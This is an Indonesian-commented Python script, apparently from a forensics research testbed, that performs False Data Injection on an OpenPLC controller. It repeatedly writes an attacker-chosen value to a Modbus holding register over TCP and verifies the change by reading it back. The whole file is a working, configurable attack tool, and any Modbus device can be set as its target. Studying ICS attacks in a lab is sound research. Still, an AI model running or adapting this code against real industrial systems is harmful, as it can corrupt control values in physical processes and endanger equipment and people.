#!/usr/bin/env python3
"""
attack_fdi.py

Simulasi Perlakuan 1:
False Data Injection melalui unauthorized Modbus write.

Script ini DIPISAH dari collector.py agar:
- collector hanya mengekstrak evidence;
- attacker hanya menjalankan perlakuan;
- hasil eksperimen tidak tercampur secara metodologis.

Contoh:
    py attack_fdi.py

Atau:
    py attack_fdi.py --value 999 --duration 12 --interval 0.4
"""

from __future__ import annotations

import argparse
import time
from typing import Any, Optional

try:
    from pymodbus.client import ModbusTcpClient
except ImportError:
    from pymodbus.client.sync import ModbusTcpClient


DEFAULT_OPENPLC_IP = "10.0.0.1"
DEFAULT_OPENPLC_PORT = 502
DEFAULT_UNIT_ID = 1
DEFAULT_REGISTER = 1024
DEFAULT_ATTACK_VALUE = 1000
DEFAULT_DURATION = 10.0
DEFAULT_INTERVAL = 0.4
DEFAULT_READBACK_DELAY = 0.05


def call_with_unit_fallback(
    method: Any,
    *,
    unit_id: int,
    **kwargs: Any,
) -> Any:
    """Kompatibilitas beberapa versi pymodbus."""
    options = [
        {"device_id": unit_id},
        {"slave": unit_id},
        {"unit": unit_id},
        {},
    ]

    last_error: Optional[TypeError] = None

    for option in options:
        try:
            return method(**kwargs, **option)
        except TypeError as error:
            last_error = error

    raise RuntimeError(
        f"Parameter pymodbus tidak kompatibel: {last_error}"
    )


def is_modbus_error(response: Any) -> bool:
    return (
        response is None
        or (
            hasattr(response, "isError")
            and response.isError()
        )
    )


def parse_arguments() -> argparse.Namespace:
    parser = argparse.ArgumentParser(
        description=(
            "Simulasi False Data Injection terkontrol "
            "ke holding register OpenPLC."
        )
    )

    parser.add_argument(
        "--ip",
        default=DEFAULT_OPENPLC_IP,
        help=f"IP OpenPLC. Default: {DEFAULT_OPENPLC_IP}",
    )
    parser.add_argument(
        "--port",
        type=int,
        default=DEFAULT_OPENPLC_PORT,
        help=f"Port Modbus TCP. Default: {DEFAULT_OPENPLC_PORT}",
    )
    parser.add_argument(
        "--unit-id",
        type=int,
        default=DEFAULT_UNIT_ID,
        help=f"Modbus Unit ID. Default: {DEFAULT_UNIT_ID}",
    )
    parser.add_argument(
        "--register",
        type=int,
        default=DEFAULT_REGISTER,
        help=(
            "Alamat holding register sasaran. "
            f"Default: {DEFAULT_REGISTER}"
        ),
    )
    parser.add_argument(
        "--value",
        type=int,
        default=DEFAULT_ATTACK_VALUE,
        help=f"Nilai serangan. Default: {DEFAULT_ATTACK_VALUE}",
    )
    parser.add_argument(
        "--duration",
        type=float,
        default=DEFAULT_DURATION,
        help=f"Durasi serangan dalam detik. Default: {DEFAULT_DURATION}",
    )
    parser.add_argument(
        "--interval",
        type=float,
        default=DEFAULT_INTERVAL,
        help=f"Jeda antar-write dalam detik. Default: {DEFAULT_INTERVAL}",
    )
    parser.add_argument(
        "--readback-delay",
        type=float,
        default=DEFAULT_READBACK_DELAY,
        help=(
            "Jeda sebelum read-back setelah write. "
            f"Default: {DEFAULT_READBACK_DELAY}"
        ),
    )

    args = parser.parse_args()

    if not 0 <= args.value <= 65535:
        parser.error("--value harus berada pada rentang 0 sampai 65535")
    if args.duration <= 0:
        parser.error("--duration harus lebih besar dari 0")
    if args.interval < 0.1:
        parser.error("--interval minimal 0.1 detik")
    if args.readback_delay < 0:
        parser.error("--readback-delay tidak boleh negatif")

    return args


def main() -> None:
    args = parse_arguments()

    client = ModbusTcpClient(
        host=args.ip,
        port=args.port,
    )

    write_success = 0
    write_failed = 0
    readback_match = 0
    readback_mismatch = 0

    print("=" * 66)
    print(" FALSE DATA INJECTION - PERLAKUAN 1")
    print("=" * 66)
    print(f"Target IP       : {args.ip}")
    print(f"Target port     : {args.port}")
    print(f"Unit ID         : {args.unit_id}")
    print(f"Holding register: {args.register}")
    print(f"Nilai serangan  : {args.value}")
    print(f"Durasi          : {args.duration:.1f} detik")
    print(f"Interval write  : {args.interval:.2f} detik")
    print("=" * 66)

    try:
        if not client.connect():
            raise ConnectionError(
                f"Gagal terhubung ke {args.ip}:{args.port}"
            )

        print("[INFO] Koneksi berhasil.")
        print("[INFO] Serangan dimulai. Tekan CTRL+C untuk menghentikan.\n")

        started = time.monotonic()
        attempt = 0

        while time.monotonic() - started < args.duration:
            attempt += 1
            cycle_started = time.monotonic()

            write_response = call_with_unit_fallback(
                client.write_register,
                unit_id=args.unit_id,
                address=args.register,
                value=args.value,
            )

            if is_modbus_error(write_response):
                write_failed += 1
                print(
                    f"[{attempt:03d}] WRITE FAILED: "
                    f"{write_response}"
                )
            else:
                write_success += 1

                if args.readback_delay > 0:
                    time.sleep(args.readback_delay)

                read_response = call_with_unit_fallback(
                    client.read_holding_registers,
                    unit_id=args.unit_id,
                    address=args.register,
                    count=1,
                )

                if (
                    is_modbus_error(read_response)
                    or not hasattr(read_response, "registers")
                    or not read_response.registers
                ):
                    readback_mismatch += 1
                    print(
                        f"[{attempt:03d}] WRITE SUCCESS | "
                        "READ-BACK FAILED"
                    )
                else:
                    actual_value = int(read_response.registers[0])

                    if actual_value == args.value:
                        readback_match += 1
                        status = "MATCH"
                    else:
                        readback_mismatch += 1
                        status = "DIFFERENT"

                    print(
                        f"[{attempt:03d}] WRITE SUCCESS | "
                        f"READ-BACK={actual_value} | {status}"
                    )

            elapsed = time.monotonic() - cycle_started
            remaining = args.interval - elapsed

            if remaining > 0:
                time.sleep(remaining)

    except KeyboardInterrupt:
        print("\n[INFO] Serangan dihentikan oleh pengguna.")

    except Exception as error:
        print(f"\n[ERROR] {error}")

    finally:
        try:
            client.close()
        except Exception:
            pass

        print("\n" + "=" * 66)
        print(" RINGKASAN PERLAKUAN")
        print("=" * 66)
        print(f"Write berhasil       : {write_success}")
        print(f"Write gagal          : {write_failed}")
        print(f"Read-back sesuai     : {readback_match}")
        print(f"Read-back berbeda    : {readback_mismatch}")
        print(
            "Recovery             : biarkan sender Raspberry Pi "
            "menulis nilai normal kembali"
        )
        print("=" * 66)


if __name__ == "__main__":
    main()
